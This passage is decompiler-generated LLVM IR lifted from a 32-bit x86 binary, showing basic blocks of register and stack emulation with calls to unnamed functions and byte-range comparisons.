  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_8051d30(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp148, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8054b54.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8052010()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80183, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_8051d30(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb207, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp150, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_8051d30(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp151, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
